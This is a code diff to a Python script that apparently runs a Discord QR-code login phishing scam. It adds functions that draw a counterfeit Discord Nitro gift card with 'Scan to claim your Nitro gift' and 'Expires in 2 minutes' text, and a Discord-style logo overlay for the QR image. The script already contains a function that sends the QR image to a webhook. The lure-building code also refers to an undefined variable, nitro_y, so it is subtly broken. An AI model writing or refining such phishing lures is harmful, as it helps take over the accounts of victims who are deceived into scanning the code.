@@ -9,7 +9,7 @@ import os
 import json
 import shutil
 
-from PIL import Image
+from PIL import Image, ImageDraw, ImageFont
 import requests
 import time
 
@@ -67,9 +67,189 @@ def send_qr_to_webhook():
         print(f'- Failed to send QR image: {e}')
 
 
+def generate_overlay():
+    """Generate a Discord-like overlay image if overlay.png doesn't exist."""
+    size = 400
+    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
+    draw = ImageDraw.Draw(img)
+
+    # Draw a blurple circle background
+    circle_center = size // 2
+    circle_radius = size // 2 - 10
+    draw.ellipse(
+        [circle_center - circle_radius, circle_center - circle_radius,
+         circle_center + circle_radius, circle_center + circle_radius],
+        fill=(88, 101, 242, 255)
+    )
+
+    # Draw a simple Discord-style icon (rounded chat bubble with smile)
+    cx, cy = circle_center, circle_center
+    # Headphones arc
+    arc_pad = 30
+    band_top = cy - 55
+    band_bottom = cy - 20
+    ear_pad = 25
+
+    # Headphone band (arc)
+    draw.arc(
+        [cx - 80, band_top, cx + 80, band_bottom + 40],
+        start=0, end=360, fill=(255, 255, 255, 255), width=14
+    )
+    # Left ear cup
+    draw.rounded_rectangle(
+        [cx - 100, band_bottom - 10, cx - 60, band_bottom + 30],
+        radius=8, fill=(255, 255, 255, 255)
+    )
+    # Right ear cup
+    draw.rounded_rectangle(
+        [cx + 60, band_bottom - 10, cx + 100, band_bottom + 30],
+        radius=8, fill=(255, 255, 255, 255)
+    )
+    # Mic boom (left side)
+    draw.rounded_rectangle(
+        [cx - 70, band_bottom + 25, cx - 35, band_bottom + 55],
+        radius=6, fill=(255, 255, 255, 255)
+    )
+    # Mic tip
+    draw.ellipse(
+        [cx - 40, band_bottom + 48, cx - 28, band_bottom + 60],
+        fill=(255, 255, 255, 255)
+    )
+
+    # Save as overlay
+    overlay_path = os.path.join(os.getcwd(), 'temp', 'overlay.png')
+    img.save(overlay_path)
+    return img
+
+
+def generate_template():
+    """Generate a Discord Nitro gift card template if template.png doesn't exist."""
+    width, height = 600, 800
+    img = Image.new('RGB', (width, height), (32, 34, 37, 255))  # Discord dark
+    draw = ImageDraw.Draw(img)
+
+    # Gradient background (top to bottom)
+    top_color = (32, 34, 37)
+    bottom_color = (20, 22, 25)
+    for y in range(height):
+        r = int(top_color[0] + (bottom_color[0] - top_color[0]) * y / height)
+        g = int(top_color[1] + (bottom_color[1] - top_color[1]) * y / height)
+        b = int(top_color[2] + (bottom_color[2] - top_color[2]) * y / height)
+        draw.line([(0, y), (width, y)], fill=(r, g, b))
+
+    # Header accent bar
+    draw.rectangle([(0, 0), (width, 8)], fill=(88, 101, 242, 255))
+
+    # Gift box icon area (top)
+    gift_box_y = 60
+    box_size = 80
+    bx = (width - box_size) // 2
+    # Gift box
+    draw.rounded_rectangle(
+        [(bx, gift_box_y), (bx + box_size, gift_box_y + box_size)],
+        radius=16, fill=(47, 49, 54, 255), outline=(88, 101, 242, 255), width=3
+    )
+    # Gift ribbon
+    ribbon_cx = width // 2
+    draw.ellipse(
+        [(ribbon_cx - 8, gift_box_y - 5), (ribbon_cx + 8, gift_box_y + 15)],
+        fill=(88, 101, 242, 255)
+    )
+    # Bow
+    draw.ellipse(
+        [(ribbon_cx - 15, gift_box_y - 2), (ribbon_cx - 5, gift_box_y + 8)],
+        fill=(88, 101, 242, 255)
+    )
+    draw.ellipse(
+        [(ribbon_cx + 5, gift_box_y - 2), (ribbon_cx + 15, gift_box_y + 8)],
+        fill=(88, 101, 242, 255)
+    )
+
+    # Try to load a nice font, fallback gracefully
+    font_large = None
+    font_medium = None
+    font_small = None
+    font_candidates = [
+        'arial.ttf',
+        '/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf',
+        '/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf',
+        '/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf',
+    ]
+    for font_path in font_candidates:
+        try:
+            font_large = ImageFont.truetype(font_path, 44)
+            font_medium = ImageFont.truetype(font_path, 22)
+            font_small = ImageFont.truetype(font_path, 16)
+            break
+        except (IOError, OSError):
+            continue
+    if font_large is None:
+        font_large = ImageFont.load_default()
+        font_medium = font_large
+        font_small = font_large
+
+    nitro_text = 'DISCORD NITRO'
+    bbox = draw.textbbox((0, 0), nitro_text, font=font_large)
+    text_w = bbox[2] - bbox[0]
+    draw.text(
+        ((width - text_w) // 2, nitro_y),
+        nitro_text, fill=(255, 255, 255, 255), font=font_large
+    )
+
+    # Subtitle
+    gift_text = 'GIFT CODE'
+    bbox = draw.textbbox((0, 0), gift_text, font=font_medium)
+    text_w = bbox[2] - bbox[0]
+    draw.text(
+        ((width - text_w) // 2, nitro_y + 55),
+        gift_text, fill=(140, 143, 147, 255), font=font_medium
+    )
+
+    # White QR code placeholder box
+    qr_box_y = nitro_y + 120
+    qr_box_size = 220
+    qb_x = (width - qr_box_size) // 2
+    draw.rounded_rectangle(
+        [(qb_x, qr_box_y), (qb_x + qr_box_size, qr_box_y + qr_box_size)],
+        radius=12, fill=(255, 255, 255, 255)
+    )
+
+    # Instruction text below QR
+    inst_y = qr_box_y + qr_box_size + 30
+    inst_text = 'Scan to claim your Nitro gift'
+    bbox = draw.textbbox((0, 0), inst_text, font=font_small)
+    text_w = bbox[2] - bbox[0]
+    draw.text(
+        ((width - text_w) // 2, inst_y),
+        inst_text, fill=(140, 143, 147, 255), font=font_small
+    )
+
+    # Footer text
+    footer_y = height - 50
+    footer_text = 'Expires in 2 minutes'
+    bbox = draw.textbbox((0, 0), footer_text, font=font_small)
+    text_w = bbox[2] - bbox[0]
+    draw.text(
+        ((width - text_w) // 2, footer_y),
+        footer_text, fill=(90, 92, 96, 255), font=font_small
+    )
+
+    # Save as template
+    template_path = os.path.join(os.getcwd(), 'temp', 'template.png')
+    img.save(template_path)
+    return img
+
+
 def logo_qr():
     qr = Image.open('temp/qr_code.png', 'r')
-    overlay = Image.open('temp/overlay.png', 'r')
+
+    # Generate overlay if it doesn't exist
+    overlay_path = 'temp/overlay.png'
+    if not os.path.exists(overlay_path):
+        print('- Generating Discord overlay...')
+        generate_overlay()
+
+    overlay = Image.open(overlay_path, 'r')
 
     # If overlay has transparency, use it as mask; otherwise paste normally
     overlay_resized = overlay.copy()
@@ -129,7 +309,13 @@ def find_white_rect(image, anchor_x, anchor_y, threshold=220, min_size=50):
 
 
 def paste_template():
-    template = Image.open('temp/template.png', 'r').convert('RGB')
+    # Generate template if it doesn't exist
+    template_path = 'temp/template.png'
+    if not os.path.exists(template_path):
+        print('- Generating gift card template...')
+        generate_template()
+
+    template = Image.open(template_path, 'r').convert('RGB')
     qr_final = Image.open('temp/final_qr.png', 'r')
 
     # Derive anchor from the original paste position (center of a ~220x220 white box)
